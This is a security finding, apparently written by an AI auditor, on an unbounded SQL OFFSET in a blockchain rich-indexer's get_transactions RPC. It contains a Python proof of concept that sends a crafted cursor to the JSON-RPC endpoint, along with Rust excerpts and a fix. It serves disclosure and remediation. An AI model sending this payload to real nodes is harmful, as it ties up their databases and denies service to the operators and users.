Let me look at the exact offset handling and any rate limiting or validation present.

### Title
Unbounded SQL OFFSET via Crafted Pagination Cursor in `get_tx_with_cell` — (`util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs`)

---

### Summary

The `get_transactions` RPC endpoint (when `group_by_transaction=false`) accepts a 12-byte `after` cursor whose last 4 bytes are decoded as an `i32` offset and passed **without any bounds validation** directly to `query_builder.offset(offset)`. An unprivileged caller can supply a cursor with a small `tx_id` (e.g., `0`) and `offset=i32::MAX` (2,147,483,647), forcing the database to scan through billions of rows before returning results.

---

### Finding Description

In `get_transactions`, when `group_by_transaction` is `false` or `None`: [1](#0-0) 

The 12-byte cursor is split: bytes 0–7 → `tx_id` (i64 LE), bytes 8–11 → `offset` (i32 LE). `decode_i32` performs only a length check — no range validation: [2](#0-1) 

The decoded `offset` is then passed verbatim to the SQL builder: [3](#0-2) 

The WHERE clause added at line 171 is `tx_id >= last`. With `last=0`, this matches **all rows** in the table. The resulting SQL is:

```sql
SELECT ... WHERE tx_id >= 0 ORDER BY tx_id ASC LIMIT <N> OFFSET 2147483647
```

The database must traverse 2,147,483,647 rows before returning any results.

**Important correction to the question's specific PoC:** Using `tx_id=i64::MAX` is self-defeating — the WHERE clause `tx_id >= i64::MAX` filters to at most 1 row, making the OFFSET trivially cheap. The effective attack requires a **small** `tx_id` (e.g., `0` or `1`) combined with `offset=i32::MAX`. [4](#0-3) 

---

### Impact Explanation

A single unauthenticated RPC call can pin a database worker thread for an arbitrarily long time, exhausting CPU and I/O. Repeated calls make the rich-indexer RPC completely unresponsive. The `request_limit` guard only bounds the `limit` parameter (number of returned rows), not the offset: [5](#0-4) 

---

### Likelihood Explanation

The rich-indexer RPC is exposed to any caller who can reach the JSON-RPC port. No authentication, PoW, or privileged role is required. The cursor format is documented and trivially constructable.

---

### Recommendation

Validate the decoded offset against a sane upper bound (e.g., reject if `offset > limit` or `offset > some_max_page_size`). Alternatively, redesign the cursor to use a keyset-only pagination scheme (store only `tx_id` + `io_index` as a tie-breaker) that avoids SQL `OFFSET` entirely, which is the standard approach for scalable cursor pagination.

---

### Proof of Concept

```python
import struct, json, requests

# tx_id = 0 (matches all rows), offset = i32::MAX
cursor = struct.pack('<q', 0) + struct.pack('<i', 2_147_483_647)
after_hex = "0x" + cursor.hex()

payload = {
    "jsonrpc": "2.0", "id": 1,
    "method": "get_transactions",
    "params": [
        {"script": {"code_hash": "0x" + "00"*32, "hash_type": "data", "args": "0x"},
         "script_type": "lock"},
        "asc", "0x1",
        after_hex   # 12-byte cursor: tx_id=0, offset=2147483647
    ]
}
# Against a node with a large rich-indexer DB, this call will hang for minutes.
r = requests.post("http://localhost:8116", json=payload, timeout=300)
print(r.json())
```

### Citations

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L23-32)
```rust
        let limit = limit.value();
        if limit == 0 {
            return Err(Error::invalid_params("limit should be greater than 0"));
        }
        if limit as usize > self.request_limit {
            return Err(Error::invalid_params(format!(
                "limit must be less than {}",
                self.request_limit,
            )));
        }
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L44-53)
```rust
                if let Some(after) = after {
                    if after.len() != 12 {
                        return Err(Error::Params(
                            "Unable to parse the 'after' parameter.".to_string(),
                        ));
                    }
                    let (last, offset) = after.as_bytes().split_at(after.len() - 4);
                    let last = decode_i64(last)?;
                    let offset = decode_i32(offset)?;
                    last_cursor = Some((last, offset));
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L169-182)
```rust
    if let Some((last, _)) = last_cursor {
        match order {
            IndexerOrder::Asc => query_builder.and_where_ge("tx_id", last),
            IndexerOrder::Desc => query_builder.and_where_le("tx_id", last),
        };
    }
    match order {
        IndexerOrder::Asc => query_builder.order_by("tx_id", false),
        IndexerOrder::Desc => query_builder.order_by("tx_id", true),
    };
    query_builder.limit(limit);
    if let Some((_, offset)) = last_cursor {
        query_builder.offset(offset);
    }
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/mod.rs (L286-294)
```rust
fn decode_i32(data: &[u8]) -> Result<i32, Error> {
    if data.len() != 4 {
        return Err(Error::Params(
            "unable to convert from bytes to i32 due to insufficient data in little-endian format"
                .to_string(),
        ));
    }
    Ok(i32::from_le_bytes(to_fixed_array(&data[0..4])))
}
```
